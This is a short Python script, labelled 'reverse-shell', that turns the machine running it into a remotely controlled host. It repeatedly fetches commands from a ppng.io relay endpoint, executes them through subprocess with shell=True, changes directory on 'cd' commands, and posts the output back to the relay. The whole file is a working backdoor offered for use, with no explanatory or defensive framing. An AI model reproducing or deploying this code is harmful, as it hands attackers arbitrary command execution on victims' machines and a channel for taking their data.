import requests
import subprocess
import os
link = 'reverse-shell'
def send(command="Received"):requests.post(f"https://ppng.io/{link}", data=str.encode(command) if type(command) == str else command);receive()
def receive():
    r = requests.get(f"https://ppng.io/{link}")
    if r.text.startswith("cd") != True:
        try:send(subprocess.check_output(r.text.split(" "), stderr=subprocess.STDOUT, shell=True))
        except Exception as err:send(f"Error : {str(err)}")  
    else:
        try:os.chdir(r.text.removeprefix("cd "));send()
        except Exception as err:send(f"Directory changing error : {str(err)}")
send()
